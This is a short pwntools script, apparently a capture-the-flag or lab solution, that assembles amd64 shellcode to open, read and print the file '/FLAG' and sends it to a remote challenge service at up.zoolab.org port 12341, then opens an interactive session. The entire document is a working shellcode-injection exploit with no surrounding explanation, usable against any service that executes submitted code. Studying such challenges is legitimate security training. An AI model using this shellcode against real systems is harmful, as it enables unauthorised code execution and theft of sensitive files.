from pwn import *

context.arch = 'amd64'

shellcode = asm('''
    /* openat(AT_FDCWD, "/FLAG", 0) */
    mov rax, 257
    mov rdi, -100           /* AT_FDCWD = -100 */
    lea rsi, [rip + path]
    xor rdx, rdx            /* flags = 0 */
    syscall

    /* read(fd, rsp, 100) */
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 100
    xor rax, rax
    syscall

    /* write(1, rsp, 100) */
    mov rdi, 1
    mov rax, 1
    syscall

    /* exit(0) */
    mov rax, 60
    xor rdi, rdi
    syscall

path:
    .ascii "/FLAG\\0"
''')

print(f"Shellcode length: {len(shellcode)}")  # 確保小於 100 bytes

r = remote('up.zoolab.org', 12341)
r.recvuntil(b'Enter your code>')
r.send(shellcode)
r.interactive()

